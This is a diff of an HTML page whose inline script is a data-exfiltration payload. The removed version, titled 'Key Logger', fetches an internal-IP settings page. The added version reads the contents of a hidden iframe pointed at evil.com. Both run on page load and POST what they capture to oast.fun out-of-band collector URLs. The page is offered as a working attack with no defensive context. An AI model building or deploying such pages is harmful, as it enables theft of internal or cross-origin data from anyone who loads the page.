@@ -3,46 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Key Logger</title>
+    <title>Iframe Content Forwarder</title>
     <script>
-        // Function to fetch data from victim.com/user and forward it to target.com
-        function fetchAndForward() {
-            var victimUrl = 'https://172.16.100.122/UserSetting'; // URL of victim.com/user
-            var targetUrl = 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/receive'; // URL of target.com's endpoint
+        // Function to fetch content from the iframe and send it to target.com
+        function forwardIframeContent() {
+            var targetUrl = 'https://jjezhcyzocwcsjemnfvilb6pp4vfhwmgo.oast.fun/receive'; // URL of target.com's endpoint
 
-            fetch(victimUrl)
-                .then(response => response.text()) // Get response text
-                .then(data => {
-                    // Send the data to target.com
-                    fetch(targetUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ data: data })
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to send data to target.com');
-                        }
-                        console.log('Data sent successfully to target.com');
-                    })
-                    .catch(error => {
-                        console.error(error);
-                    });
+            // Get the iframe element
+            var iframe = document.getElementById('evilFrame');
+
+            // Check if the iframe element exists
+            if (iframe) {
+                // Get the content of the iframe
+                var iframeContent = iframe.contentWindow.document.body.innerHTML;
+
+                // Send the content to target.com
+                fetch(targetUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/html'
+                    },
+                    body: iframeContent
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send iframe content to target.com');
+                    }
+                    console.log('Iframe content sent successfully to target.com');
                 })
                 .catch(error => {
-                    console.error('Failed to fetch data from victim.com/user:', error);
+                    console.error(error);
                 });
+            } else {
+                console.error('Iframe element not found');
+            }
         }
 
         // Call the function when the page loads
         window.onload = function() {
-            fetchAndForward();
+            forwardIframeContent();
         };
     </script>
 </head>
 <body>
     <!-- Your HTML content here -->
+    <!-- The iframe that loads evil.com -->
+    <iframe id="evilFrame" src="https://evil.com" style="display: none;"></iframe>
 </body>
 </html>
